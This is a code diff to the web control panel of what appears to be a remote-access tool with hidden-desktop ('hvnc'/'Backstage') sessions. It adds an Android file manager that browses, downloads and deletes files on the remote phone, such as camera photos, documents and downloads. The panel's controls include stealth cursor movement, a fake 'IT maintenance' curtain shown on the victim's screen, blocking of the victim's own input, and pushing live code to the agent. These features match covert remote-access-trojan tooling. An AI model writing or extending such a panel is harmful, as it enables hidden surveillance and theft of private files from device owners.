@@ -546,8 +546,8 @@
         }
 
         .smartphone-wrapper.desktop-mode .phone-punchhole,
-        .smartphone-wrapper.desktop-mode .phone-hw-btn,
-        .smartphone-wrapper.desktop-mode .android-navbar {
+        .smartphone-wrapper .phone-hw-btn,
+        .smartphone-wrapper .android-navbar {
             display: none !important;
         }
 
@@ -779,59 +779,52 @@
                 </button>
             </div>
 
-            <!-- Take Control Physical Mirror Actions -->
+            <!-- Take Control Physical Mirror Actions (Windows) -->
             <div id="mirrorHeaderActions" style="display: none; gap: 5px; align-items: center;">
                 <button class="header-btn" onclick="sendRemoteShortcut(0x11, 0x10, 0x1B)" title="Ctrl + Shift + Esc (Physical Task Manager)">
                     <span>📊 TaskMgr</span>
                 </button>
             </div>
 
-            <!-- Android Mobile Header Actions -->
+            <!-- Android Mobile Header Actions (Clean, dedicated Android controls) -->
             <div id="androidHeaderActions" style="display: none; gap: 6px; align-items: center;">
-                <div style="display: flex; align-items: center; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.14); border-radius: 4px; padding: 1px 4px;">
-                    <input type="text" id="androidTextInput" placeholder="Type text to send to phone..." style="background: transparent; border: none; outline: none; color: #f8fafc; font-size: 11px; width: 170px; padding: 2px 4px;" onkeydown="if(event.key==='Enter') sendAndroidQuickText()">
-                    <button class="header-btn" onclick="sendAndroidQuickText()" title="Send Text to Focused Phone Input" style="padding: 1px 6px; height: 18px; color: #38bdf8;">Send ⏎</button>
-                </div>
-                <button class="header-btn" onclick="sendAndroidNav('home', 3)" title="Phone Home (○)">
-                    <span>🏠 Home</span>
+                <button class="header-btn" onclick="openFileManagerModal()" title="Browse Android Internal Storage & Download Files" style="color: #38bdf8; border-color: rgba(56, 189, 248, 0.4);">
+                    <span>📁 File Manager</span>
                 </button>
-                <button class="header-btn" onclick="sendAndroidNav('back', 4)" title="Phone Back (◁)">
-                    <span>◁ Back</span>
-                </button>
-                <button class="header-btn" onclick="sendAndroidNav('recents', 187)" title="Recent Apps (□)">
-                    <span>□ Apps</span>
-                </button>
-                <button class="header-btn" onclick="sendAndroidNav('power', 26)" title="Lock / Wake Screen (⏻)">
-                    <span>⏻ Lock</span>
+                <button class="header-btn" onclick="requestMirrorRefresh()" title="Refresh Screen Mirror">
+                    <span>🔄 Refresh Screen</span>
                 </button>
             </div>
         </div>
 
         <div class="header-right">
-            <select id="mirrorQuality" class="header-btn" hidden aria-label="Take Control image quality" onchange="setMirrorQuality()" title="Balanced sharpens text when input stops. Sharper text uses more bandwidth.">
-                <option value="balanced">Quality: Balanced</option>
-                <option value="sharp">Quality: Sharper text</option>
-                <option value="fast">Quality: Faster response</option>
-            </select>
-            <!-- Stealth Mouse Toggle (Hide Hover Movement) -->
-            <button class="header-btn" id="stealthMouseBtn" onclick="toggleStealthMouse()" title="Stealth Mouse: Suppress hover cursor movement on target (cursor moves only on click/drag)">
-                <span id="stealthMouseLabel">🖱️ Mouse: Live</span>
-            </button>
+            <!-- Windows-specific actions grouped under #windowsHeaderActions -->
+            <div id="windowsHeaderActions" style="display: flex; gap: 5px; align-items: center;">
+                <select id="mirrorQuality" class="header-btn" hidden aria-label="Take Control image quality" onchange="setMirrorQuality()" title="Balanced sharpens text when input stops. Sharper text uses more bandwidth.">
+                    <option value="balanced">Quality: Balanced</option>
+                    <option value="sharp">Quality: Sharper text</option>
+                    <option value="fast">Quality: Faster response</option>
+                </select>
+                <!-- Stealth Mouse Toggle (Hide Hover Movement) -->
+                <button class="header-btn" id="stealthMouseBtn" onclick="toggleStealthMouse()" title="Stealth Mouse: Suppress hover cursor movement on target (cursor moves only on click/drag)">
+                    <span id="stealthMouseLabel">🖱️ Mouse: Live</span>
+                </button>
 
-            <!-- Privacy Screen Curtain (Take Control) -->
-            <button class="header-btn" id="curtainToggleBtn" onclick="toggleScreenCurtain()" title="Screen Curtain: Display IT maintenance privacy screen on target monitor (excluded from your view)">
-                <span id="curtainModeLabel">🛡️ Curtain: Off</span>
-            </button>
+                <!-- Privacy Screen Curtain (Take Control) -->
+                <button class="header-btn" id="curtainToggleBtn" onclick="toggleScreenCurtain()" title="Screen Curtain: Display IT maintenance privacy screen on target monitor (excluded from your view)">
+                    <span id="curtainModeLabel">🛡️ Curtain: Off</span>
+                </button>
 
-            <!-- Block Remote User Input (Take Control) -->
-            <button class="header-btn" id="blockInputBtn" onclick="toggleBlockInput()" title="Block Remote Input: Temporarily lock physical mouse & keyboard on target machine">
-                <span id="blockInputLabel">🚫 Input: Free</span>
-            </button>
+                <!-- Block Remote User Input (Take Control) -->
+                <button class="header-btn" id="blockInputBtn" onclick="toggleBlockInput()" title="Block Remote Input: Temporarily lock physical mouse & keyboard on target machine">
+                    <span id="blockInputLabel">🚫 Input: Free</span>
+                </button>
 
-            <!-- OTA Live Code Sync -->
-            <button class="header-btn" id="btnSyncCode" onclick="triggerLiveCodeSync()" title="Push Latest Code & Features to Target Agent (No Recompiling!)" style="color: #38bdf8; border-color: rgba(56, 189, 248, 0.4);">
-                <span>⚡ Sync</span>
-            </button>
+                <!-- OTA Live Code Sync -->
+                <button class="header-btn" id="btnSyncCode" onclick="triggerLiveCodeSync()" title="Push Latest Code & Features to Target Agent (No Recompiling!)" style="color: #38bdf8; border-color: rgba(56, 189, 248, 0.4);">
+                    <span>⚡ Sync</span>
+                </button>
+            </div>
 
             <!-- Fullscreen -->
             <button class="header-btn" onclick="toggleFullscreen()" title="Toggle Fullscreen (F11)">
@@ -1020,6 +1013,88 @@
         </div>
     </div>
 
+    <!-- Android File Manager Modal -->
+    <div id="fileManagerModal" class="modal-overlay" style="display: none; z-index: 10005;" onclick="handleFmBackdropClick(event)">
+        <div class="modal-card" style="width: 860px; max-width: 95vw; height: 620px; max-height: 90vh; display: flex; flex-direction: column; background: #0b1120; border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.85); overflow: hidden;">
+            <!-- Header -->
+            <div class="modal-header" style="padding: 12px 18px; background: rgba(15, 23, 42, 0.95); border-bottom: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-between;">
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <span style="font-size: 18px;">📁</span>
+                    <div>
+                        <h3 style="font-size: 13px; font-weight: 700; color: #f8fafc; margin: 0;" id="fmModalTitle">Android Device File Manager</h3>
+                        <p style="font-size: 11px; color: #94a3b8; margin: 0;" id="fmModalSubtitle">Browse internal storage, navigate folders, and download files</p>
+                    </div>
+                </div>
+                <button class="header-btn" onclick="closeFileManagerModal()" style="padding: 3px 8px; font-size: 13px;" title="Close">✕</button>
+            </div>
+
+            <!-- Toolbar: Nav Buttons, Breadcrumbs / Path Input, Search Filter -->
+            <div style="padding: 10px 16px; background: rgba(15, 23, 42, 0.6); border-bottom: 1px solid rgba(255, 255, 255, 0.08); display: flex; flex-direction: column; gap: 8px;">
+                <div style="display: flex; align-items: center; gap: 6px;">
+                    <button class="header-btn" id="fmBtnBack" onclick="fmNavigateBack()" title="Back" disabled>◀ Back</button>
+                    <button class="header-btn" id="fmBtnForward" onclick="fmNavigateForward()" title="Forward" disabled>Forward ▶</button>
+                    <button class="header-btn" id="fmBtnUp" onclick="fmNavigateUp()" title="Go to Parent Folder">⬆ Up</button>
+                    <button class="header-btn" onclick="fmRefresh()" title="Refresh Directory">🔄 Refresh</button>
+
+                    <!-- Path Input -->
+                    <div style="flex: 1; display: flex; align-items: center; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.12); border-radius: 6px; padding: 2px 8px;">
+                        <span style="font-size: 11px; color: #64748b; margin-right: 4px;">📂</span>
+                        <input type="text" id="fmCurrentPathInput" style="flex: 1; background: transparent; border: none; outline: none; color: #38bdf8; font-family: ui-monospace, monospace; font-size: 12px; padding: 4px 0;" onkeydown="if(event.key==='Enter') fmGoToPath(this.value)" placeholder="/storage/emulated/0" spellcheck="false" />
+                        <button class="header-btn" onclick="fmGoToPath(document.getElementById('fmCurrentPathInput').value)" style="padding: 1px 6px; height: 18px; font-size: 10px;">Go ⏎</button>
+                    </div>
+
+                    <!-- Search / Filter in Current Folder -->
+                    <div style="width: 170px; display: flex; align-items: center; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.12); border-radius: 6px; padding: 2px 8px;">
+                        <span style="font-size: 11px; color: #64748b; margin-right: 4px;">🔍</span>
+                        <input type="text" id="fmSearchInput" style="width: 100%; background: transparent; border: none; outline: none; color: #f8fafc; font-size: 11px; padding: 4px 0;" placeholder="Filter files..." oninput="fmFilterFiles(this.value)" />
+                    </div>
+                </div>
+
+                <!-- Storage Shortcut Pills -->
+                <div style="display: flex; align-items: center; gap: 6px; overflow-x: auto; padding-bottom: 2px;" id="fmShortcutsRow">
+                    <button class="header-btn" onclick="fmGoToPath('/storage/emulated/0')" title="Internal Storage">📱 Internal Storage</button>
+                    <button class="header-btn" onclick="fmGoToPath('/storage/emulated/0/Download')" title="Downloads">📥 Downloads</button>
+                    <button class="header-btn" onclick="fmGoToPath('/storage/emulated/0/Documents')" title="Documents">📄 Documents</button>
+                    <button class="header-btn" onclick="fmGoToPath('/storage/emulated/0/Pictures')" title="Pictures">🖼️ Pictures</button>
+                    <button class="header-btn" onclick="fmGoToPath('/storage/emulated/0/DCIM')" title="DCIM (Camera)">📸 DCIM</button>
+                    <button class="header-btn" onclick="fmGoToPath('/storage/emulated/0/Music')" title="Music">🎵 Music</button>
+                    <button class="header-btn" onclick="fmGoToPath('')" title="Root / App Storage">📂 App Storage</button>
+                </div>
+            </div>
+
+            <!-- Body / File Listing Table -->
+            <div style="flex: 1; overflow-y: auto; background: #030712; position: relative;" id="fmFileListContainer">
+                <table style="width: 100%; border-collapse: collapse; font-size: 12px; text-align: left;">
+                    <thead style="position: sticky; top: 0; background: #080d1a; border-bottom: 1px solid rgba(255,255,255,0.08); z-index: 5;">
+                        <tr>
+                            <th style="padding: 8px 12px; color: #94a3b8; font-weight: 600; width: 50%;">Name</th>
+                            <th style="padding: 8px 12px; color: #94a3b8; font-weight: 600; width: 15%;">Size</th>
+                            <th style="padding: 8px 12px; color: #94a3b8; font-weight: 600; width: 20%;">Date Modified</th>
+                            <th style="padding: 8px 12px; color: #94a3b8; font-weight: 600; width: 15%; text-align: right;">Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="fmTableBody">
+                        <!-- Populated by JavaScript -->
+                    </tbody>
+                </table>
+                <div id="fmLoadingOverlay" style="position: absolute; inset: 0; background: rgba(3,7,18,0.7); display: none; align-items: center; justify-content: center; z-index: 10;">
+                    <div style="display: flex; flex-direction: column; align-items: center; gap: 8px; color: #38bdf8;">
+                        <div style="width: 24px; height: 24px; border: 2px solid #38bdf8; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+                        <span style="font-size: 12px;">Reading device storage...</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Footer Status Bar -->
+            <div style="padding: 8px 16px; background: rgba(10, 15, 26, 0.95); border-top: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-between; font-size: 11px; color: #94a3b8;">
+                <div id="fmStatusBarInfo">0 items</div>
+                <div style="display: flex; gap: 8px;">
+                    <button class="header-btn" onclick="closeFileManagerModal()">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Toast Notifications -->
     <div class="toast-container" id="toastContainer"></div>
 
@@ -1061,8 +1136,22 @@
         let isAndroidDevice = false;
         let touchDragState = null;
 
+        function escapeHtml(str) {
+            if (!str) return "";
+            return String(str)
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
         async function detectDeviceType() {
             try {
+                const urlParams = new URLSearchParams(window.location.search);
+                if (urlParams.get("platform") === "android") {
+                    applyAndroidMode();
+                }
                 const res = await fetch('/api/agents');
                 if (res.ok) {
                     const data = await res.json();
@@ -1073,6 +1162,8 @@
                         const platStr = (ag.platform || "").toLowerCase();
                         if (ag.is_android || archStr === "android" || platStr === "android" || osStr.includes("android")) {
                             applyAndroidMode(ag);
+                        } else {
+                            applyWindowsMode(ag);
                         }
                     }
                 }
@@ -1082,7 +1173,6 @@
         }
 
         function applyAndroidMode(agentInfo) {
-            if (isAndroidDevice) return;
             isAndroidDevice = true;
             const wrapper = document.getElementById("smartphoneWrapper");
             if (wrapper) {
@@ -1093,30 +1183,375 @@
             const bkAct = document.getElementById("backstageHeaderActions");
             const mrAct = document.getElementById("mirrorHeaderActions");
             const andAct = document.getElementById("androidHeaderActions");
+            const winAct = document.getElementById("windowsHeaderActions");
             const startBtn = document.getElementById("startBtnTrigger");
-            const stealthBtn = document.getElementById("stealthMouseBtn");
+            const startModal = document.getElementById("startMenuModal");
 
             if (bkAct) bkAct.style.display = "none";
             if (mrAct) mrAct.style.display = "none";
-            if (andAct) andAct.style.display = "flex";
+            if (winAct) winAct.style.display = "none";
             if (startBtn) startBtn.style.display = "none";
-            if (stealthBtn) stealthBtn.style.display = "none";
+            if (startModal) startModal.classList.remove("open");
+            if (andAct) andAct.style.display = "flex";
 
             const targetTitle = document.getElementById("hvncTargetTitle");
             if (targetTitle) {
-                const devName = (agentInfo && agentInfo.hostname) ? agentInfo.hostname : 'Phone';
+                const devName = (agentInfo && (agentInfo.endpoint_tag || agentInfo.hostname)) ? (agentInfo.endpoint_tag || agentInfo.hostname) : 'Android Device';
                 targetTitle.innerHTML = `
                     <span style="width: 7px; height: 7px; border-radius: 50%; background: #10b981; box-shadow: 0 0 8px #10b981; animation: pulseDot 1.5s infinite;"></span>
-                    <span>📱 [${agentId}] ${devName}</span>
+                    <span>📱 [${escapeHtml(agentId)}] ${escapeHtml(devName)}</span>
                     <span style="margin-left: 6px; padding: 2px 7px; border-radius: 4px; font-size: 10px; font-weight: 700; background: rgba(56, 189, 248, 0.15); border: 1px solid rgba(56, 189, 248, 0.4); color: #38bdf8; letter-spacing: 0.5px;">ANDROID MIRROR</span>
                 `;
             }
             document.title = `TRMM [Android Mirror] — [${agentId}]`;
 
-            const curtainLabel = document.getElementById("curtainModeLabel");
-            if (curtainLabel) curtainLabel.innerText = "🔒 Lock Device";
-
             resizeDisplay();
+        }
+
+        function applyWindowsMode(agentInfo) {
+            if (isAndroidDevice) return;
+            const isMirror = (sessionMode === 'mirror');
+            const winAct = document.getElementById("windowsHeaderActions");
+            const bkAct = document.getElementById("backstageHeaderActions");
+            const mrAct = document.getElementById("mirrorHeaderActions");
+            const andAct = document.getElementById("androidHeaderActions");
+            const startBtn = document.getElementById("startBtnTrigger");
+            const qualitySel = document.getElementById("mirrorQuality");
+
+            if (winAct) winAct.style.display = "flex";
+            if (andAct) andAct.style.display = "none";
+
+            if (isMirror) {
+                if (bkAct) bkAct.style.display = "none";
+                if (mrAct) mrAct.style.display = "flex";
+                if (startBtn) startBtn.style.display = "none";
+                if (qualitySel) qualitySel.hidden = false;
+            } else {
+                if (bkAct) bkAct.style.display = "flex";
+                if (mrAct) mrAct.style.display = "none";
+                if (startBtn) startBtn.style.display = "flex";
+                if (qualitySel) qualitySel.hidden = true;
+            }
+
+            const modeLabel = isMirror ? '🖥 SCREEN MIRROR' : '🎭 BACKSTAGE';
+            const modeColor = isMirror ? '#10b981' : '#a855f7';
+            const modeBg = isMirror ? 'rgba(16, 185, 129, 0.15)' : 'rgba(168, 85, 247, 0.15)';
+            const modeBorder = isMirror ? 'rgba(16, 185, 129, 0.4)' : 'rgba(168, 85, 247, 0.4)';
+
+            const devName = (agentInfo && (agentInfo.endpoint_tag || agentInfo.hostname)) ? (agentInfo.endpoint_tag || agentInfo.hostname) : '';
+            const titleSuffix = devName ? ` ${escapeHtml(devName)}` : '';
+
+            const targetTitle = document.getElementById("hvncTargetTitle");
+            if (targetTitle) {
+                targetTitle.innerHTML = `
+                    <span style="width: 6px; height: 6px; border-radius: 50%; background: ${modeColor}; box-shadow: 0 0 6px ${modeColor};"></span>
+                    <span>[${escapeHtml(agentId)}]${titleSuffix}</span>
+                    <span style="margin-left: 6px; padding: 2px 7px; border-radius: 4px; font-size: 10px; font-weight: 700; background: ${modeBg}; border: 1px solid ${modeBorder}; color: ${modeColor}; letter-spacing: 0.5px;">${modeLabel}</span>
+                `;
+            }
+            document.title = `TRMM [${isMirror ? 'Screen Mirror' : 'Backstage'}] — [${agentId}]`;
+        }
+
+        // =================================================================
+        // Android Device File Manager Client Logic
+        // =================================================================
+        let fmCurrentPath = "/storage/emulated/0";
+        let fmHistory = [];
+        let fmHistoryIndex = -1;
+        let fmCurrentEntries = [];
+        let fmCurrentAgentId = "";
+
+        function openFileManagerModal(targetAgentOverride) {
+            fmCurrentAgentId = targetAgentOverride || agentId;
+            const modal = document.getElementById("fileManagerModal");
+            if (modal) {
+                modal.style.display = "flex";
+                modal.classList.add("active");
+            }
+            const titleEl = document.getElementById("fmModalTitle");
+            if (titleEl) {
+                titleEl.innerText = `Android File Manager — [${fmCurrentAgentId}]`;
+            }
+            if (fmHistory.length === 0) {
+                fmLoadDirectory("/storage/emulated/0", true);
+            } else {
+                fmRefresh();
+            }
+        }
+
+        function closeFileManagerModal() {
+            const modal = document.getElementById("fileManagerModal");
+            if (modal) {
+                modal.style.display = "none";
+                modal.classList.remove("active");
+            }
+        }
+
+        function handleFmBackdropClick(event) {
+            if (event.target && event.target.id === "fileManagerModal") {
+                closeFileManagerModal();
+            }
+        }
+
+        async function fmLoadDirectory(targetPath, pushHistory = true) {
+            const targetAgent = fmCurrentAgentId || agentId;
+            if (!targetAgent) return;
+            const loading = document.getElementById("fmLoadingOverlay");
+            if (loading) loading.style.display = "flex";
+
+            try {
+                const res = await fetch(`/api/agent/${targetAgent}/files/list`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ path: targetPath || "" })
+                });
+
+                if (!res.ok) {
+                    const err = await res.json().catch(() => ({}));
+                    showToast("Storage Error", err.msg || err.detail || "Unable to list directory", "error");
+                    if (loading) loading.style.display = "none";
+                    return;
+                }
+
+                const data = await res.json();
+                if (!data.success) {
+                    showToast("Access Denied", data.msg || "Cannot read storage directory", "error");
+                    if (loading) loading.style.display = "none";
+                    return;
+                }
+
+                fmCurrentPath = data.path || targetPath || "/";
+                const pathInput = document.getElementById("fmCurrentPathInput");
+                if (pathInput) pathInput.value = fmCurrentPath;
+
+                if (pushHistory) {
+                    if (fmHistoryIndex < fmHistory.length - 1) {
+                        fmHistory = fmHistory.slice(0, fmHistoryIndex + 1);
+                    }
+                    fmHistory.push(fmCurrentPath);
+                    fmHistoryIndex = fmHistory.length - 1;
+                }
+
+                updateFmNavButtons();
+                fmCurrentEntries = data.entries || [];
+                renderFmEntries(fmCurrentEntries);
+
+                if (data.shortcuts && data.shortcuts.length > 0) {
+                    renderFmShortcuts(data.shortcuts);
+                }
+
+            } catch (err) {
+                showToast("Connection Error", err.message, "error");
+            } finally {
+                if (loading) loading.style.display = "none";
+            }
+        }
+
+        function updateFmNavButtons() {
+            const btnBack = document.getElementById("fmBtnBack");
+            const btnFwd = document.getElementById("fmBtnForward");
+            const btnUp = document.getElementById("fmBtnUp");
+            if (btnBack) btnBack.disabled = (fmHistoryIndex <= 0);
+            if (btnFwd) btnFwd.disabled = (fmHistoryIndex >= fmHistory.length - 1);
+            if (btnUp) btnUp.disabled = (!fmCurrentPath || fmCurrentPath === "/" || fmCurrentPath === "");
+        }
+
+        function fmNavigateBack() {
+            if (fmHistoryIndex > 0) {
+                fmHistoryIndex--;
+                fmLoadDirectory(fmHistory[fmHistoryIndex], false);
+            }
+        }
+
+        function fmNavigateForward() {
+            if (fmHistoryIndex < fmHistory.length - 1) {
+                fmHistoryIndex++;
+                fmLoadDirectory(fmHistory[fmHistoryIndex], false);
+            }
+        }
+
+        function fmNavigateUp() {
+            if (!fmCurrentPath || fmCurrentPath === "/") return;
+            const parts = fmCurrentPath.replace(/\/+$/, '').split('/').filter(Boolean);
+            parts.pop();
+            const parentPath = parts.length > 0 ? '/' + parts.join('/') : '/';
+            fmLoadDirectory(parentPath, true);
+        }
+
+        function fmRefresh() {
+            fmLoadDirectory(fmCurrentPath, false);
+        }
+
+        function fmGoToPath(path) {
+            const trimmed = (path || "").trim();
+            fmLoadDirectory(trimmed, true);
+        }
+
+        function renderFmShortcuts(shortcuts) {
+            const row = document.getElementById("fmShortcutsRow");
+            if (!row || !shortcuts) return;
+            row.innerHTML = shortcuts.map(s => {
+                const icon = s.name.includes("Download") ? "📥" :
+                             s.name.includes("Document") ? "📄" :
+                             s.name.includes("Picture") ? "🖼️" :
+                             s.name.includes("DCIM") ? "📸" :
+                             s.name.includes("Music") ? "🎵" :
+                             s.name.includes("Internal") ? "📱" : "📂";
+                const safePath = (s.path || "").replace(/'/g, "\\'");
+                return `<button class="header-btn" onclick="fmGoToPath('${safePath}')" title="${s.path}">${icon} ${escapeHtml(s.name)}</button>`;
+            }).join("");
+        }
+
+        function fmGetFileIcon(entry) {
+            if (entry.is_dir) return "📁";
+            const name = (entry.name || "").toLowerCase();
+            if (name.endsWith(".apk")) return "📦";
+            if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".webp") || name.endsWith(".gif")) return "🖼️";
+            if (name.endsWith(".mp4") || name.endsWith(".mkv") || name.endsWith(".webm") || name.endsWith(".3gp")) return "🎬";
+            if (name.endsWith(".mp3") || name.endsWith(".m4a") || name.endsWith(".ogg") || name.endsWith(".wav") || name.endsWith(".aac")) return "🎵";
+            if (name.endsWith(".pdf") || name.endsWith(".doc") || name.endsWith(".docx")) return "📄";
+            if (name.endsWith(".zip") || name.endsWith(".tar") || name.endsWith(".gz") || name.endsWith(".7z") || name.endsWith(".rar")) return "🗜️";
+            if (name.endsWith(".txt") || name.endsWith(".json") || name.endsWith(".log") || name.endsWith(".xml") || name.endsWith(".html")) return "📝";
+            return "📄";
+        }
+
+        function fmFormatSize(bytes) {
+            if (bytes === null || bytes === undefined || bytes < 0) return "—";
+            if (bytes === 0) return "0 B";
+            const units = ["B", "KB", "MB", "GB", "TB"];
+            const i = Math.floor(Math.log(bytes) / Math.log(1024));
+            return (bytes / Math.pow(1024, i)).toFixed(i === 0 ? 0 : 1) + " " + units[i];
+        }
+
+        function fmFormatDate(epochSeconds) {
+            if (!epochSeconds) return "—";
+            try {
+                const d = new Date(epochSeconds * 1000);
+                return d.toLocaleDateString() + " " + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            } catch (e) {
+                return "—";
+            }
+        }
+
+        function renderFmEntries(entries) {
+            const tbody = document.getElementById("fmTableBody");
+            const statusInfo = document.getElementById("fmStatusBarInfo");
+            if (!tbody) return;
+
+            if (!entries || entries.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="4" style="text-align: center; padding: 24px; color: #64748b; font-size: 12px;">This directory is empty or inaccessible.</td></tr>`;
+                if (statusInfo) statusInfo.innerText = "0 items";
+                return;
+            }
+
+            let dirCount = 0;
+            let fileCount = 0;
+            let totalBytes = 0;
+
+            const rowsHtml = entries.map(entry => {
+                if (entry.is_dir) {
+                    dirCount++;
+                } else {
+                    fileCount++;
+                    totalBytes += (entry.size || 0);
+                }
+
+                const icon = fmGetFileIcon(entry);
+                const safePath = (entry.path || "").replace(/'/g, "\\'");
+                const safeName = (entry.name || "").replace(/'/g, "\\'");
+                const sizeStr = entry.is_dir ? "—" : fmFormatSize(entry.size);
+                const dateStr = fmFormatDate(entry.last_modified);
+
+                const rowClick = entry.is_dir ? `ondblclick="fmGoToPath('${safePath}')"` : `ondblclick="fmDownloadFile('${safePath}', '${safeName}')"`;
+                const cursorStyle = entry.is_dir ? 'cursor: pointer;' : 'cursor: default;';
+
+                return `
+                    <tr style="${cursorStyle} border-bottom: 1px solid rgba(255,255,255,0.04); transition: background 0.1s;" onmouseover="this.style.background='rgba(56,189,248,0.06)'" onmouseout="this.style.background=''" ${rowClick}>
+                        <td style="padding: 7px 12px; display: flex; align-items: center; gap: 8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                            <span style="font-size: 15px; flex-shrink: 0;">${icon}</span>
+                            <span style="color: ${entry.is_dir ? '#38bdf8' : '#e2e8f0'}; font-weight: ${entry.is_dir ? '600' : '400'}; overflow: hidden; text-overflow: ellipsis;" title="${escapeHtml(entry.name)}">
+                                ${escapeHtml(entry.name)}
+                            </span>
+                        </td>
+                        <td style="padding: 7px 12px; color: #94a3b8; font-family: ui-monospace, monospace; font-size: 11px;">${sizeStr}</td>
+                        <td style="padding: 7px 12px; color: #64748b; font-size: 11px;">${dateStr}</td>
+                        <td style="padding: 7px 12px; text-align: right; white-space: nowrap;">
+                            ${entry.is_dir ? `
+                                <button class="header-btn" onclick="fmGoToPath('${safePath}')" style="padding: 2px 7px; font-size: 10px;" title="Open folder">Open 📂</button>
+                            ` : `
+                                <button class="header-btn" onclick="fmDownloadFile('${safePath}', '${safeName}')" style="padding: 2px 7px; font-size: 10px; color: #38bdf8; border-color: rgba(56,189,248,0.4);" title="Download file to computer">⬇ Download</button>
+                            `}
+                            <button class="header-btn" onclick="fmDeleteFile('${safePath}', '${safeName}')" style="padding: 2px 6px; font-size: 10px; color: #f87171; border-color: rgba(239,68,68,0.3); margin-left: 4px;" title="Delete file">🗑</button>
+                        </td>
+                    </tr>
+                `;
+            }).join("");
+
+            tbody.innerHTML = rowsHtml;
+            if (statusInfo) {
+                statusInfo.innerText = `${dirCount} folder${dirCount === 1 ? '' : 's'}, ${fileCount} file${fileCount === 1 ? '' : 's'} (${fmFormatSize(totalBytes)})`;
+            }
+        }
+
+        function fmFilterFiles(query) {
+            const q = (query || "").trim().toLowerCase();
+            if (!q) {
+                renderFmEntries(fmCurrentEntries);
+                return;
+            }
+            const filtered = (fmCurrentEntries || []).filter(e => (e.name || "").toLowerCase().includes(q));
+            renderFmEntries(filtered);
+        }
+
+        async function fmDownloadFile(filePath, fileName) {
+            const targetAgent = fmCurrentAgentId || agentId;
+            if (!targetAgent) return;
+            showToast("Downloading File", `Requesting ${fileName} from device...`, "info");
+            try {
+                const res = await fetch(`/api/agent/${targetAgent}/files/download`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ path: filePath })
+                });
+                if (!res.ok) {
+                    const err = await res.json().catch(() => ({}));
+                    showToast("Download Failed", err.msg || err.detail || "Cannot read file", "error");
+                    return;
+                }
+                const blob = await res.blob();
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement("a");
+                a.href = url;
+                a.download = fileName || "download";
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                showToast("Download Complete", `Saved ${fileName}`, "success");
+            } catch (e) {
+                showToast("Download Error", e.message, "error");
+            }
+        }
+
+        async function fmDeleteFile(filePath, fileName) {
+            if (!confirm(`Are you sure you want to delete "${fileName}" from the remote device?`)) return;
+            const targetAgent = fmCurrentAgentId || agentId;
+            try {
+                const res = await fetch(`/api/agent/${targetAgent}/files/delete`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ path: filePath })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast("File Deleted", `Deleted ${fileName}`, "success");
+                    fmRefresh();
+                } else {
+                    showToast("Delete Failed", data.msg || "Operation failed", "error");
+                }
+            } catch (e) {
+                showToast("Delete Error", e.message, "error");
+            }
         }
 
         function sendAndroidNav(action, keycode) {
@@ -1173,31 +1608,14 @@
             }
             resizeDisplay();
 
-            // Detect whether connected endpoint is Android mobile
-            detectDeviceType();
-
-            const isMirror = (sessionMode === 'mirror');
-            document.getElementById('mirrorQuality').hidden = !isMirror;
-            const modeLabel = isMirror ? '🖥 SCREEN MIRROR' : '🎭 BACKSTAGE';
-            const modeColor = isMirror ? '#10b981' : '#a855f7';
-            const modeBg = isMirror ? 'rgba(16, 185, 129, 0.15)' : 'rgba(168, 85, 247, 0.15)';
-            const modeBorder = isMirror ? 'rgba(16, 185, 129, 0.4)' : 'rgba(168, 85, 247, 0.4)';
-
-            document.getElementById("hvncTargetTitle").innerHTML = `
-                <span style="width: 6px; height: 6px; border-radius: 50%; background: ${modeColor}; box-shadow: 0 0 6px ${modeColor};"></span>
-                <span>[${agentId}]</span>
-                <span style="margin-left: 6px; padding: 2px 7px; border-radius: 4px; font-size: 10px; font-weight: 700; background: ${modeBg}; border: 1px solid ${modeBorder}; color: ${modeColor}; letter-spacing: 0.5px;">${modeLabel}</span>
-            `;
-            document.title = `TRMM [${isMirror ? 'Screen Mirror' : 'Backstage'}] — [${agentId}]`;
-
-            if (isMirror) {
-                const bkAct = document.getElementById("backstageHeaderActions");
-                const mrAct = document.getElementById("mirrorHeaderActions");
-                const startBtn = document.getElementById("startBtnTrigger");
-                if (bkAct) bkAct.style.display = "none";
-                if (mrAct) mrAct.style.display = "flex";
-                if (startBtn) startBtn.style.display = "none";
+            // Detect whether connected endpoint is Android mobile or Windows
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get("platform") === "android") {
+                applyAndroidMode();
+            } else {
+                applyWindowsMode();
             }
+            detectDeviceType();
 
             // Start 60Hz mouse dispatcher
             startInputDispatchLoop();
@@ -1919,7 +2337,7 @@
         function resizeDisplay() {
             if (!hvncCanvas) return;
             if (isAndroidDevice) {
-                const availH = window.innerHeight - 28 - 42 - 32; // Deduct top bar (28px), navbar (42px), padding (32px)
+                const availH = window.innerHeight - 28 - 24; // Deduct top bar (28px) and stage padding (24px)
                 const srcW = hvncCanvas.width || 720;
                 const srcH = hvncCanvas.height || 1560;
                 const ratio = srcW / srcH;
